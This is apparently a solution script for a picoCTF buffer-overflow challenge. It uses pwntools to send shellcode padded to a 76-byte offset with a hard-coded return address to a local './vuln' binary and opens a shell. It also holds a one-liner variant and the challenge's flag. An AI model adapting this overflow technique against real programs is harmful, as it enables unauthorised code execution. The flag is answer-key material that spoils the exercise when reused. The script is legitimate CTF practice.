#!/usr/bin/env python3

from pwn import *

offset = 76

s = process('./vuln')
s.recvuntil('\n')

shellcode = asm(shellcraft.sh())
payload = shellcode
payload += b'A'*(offset-len(shellcode))
payload += p32(0xffffd1b0) # ret_addr 
s.sendline(payload)
s.interactive()

# python -c 'print"A"*76+ b"\xe6\x85\x04\x08"' | ./vuln
# picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}
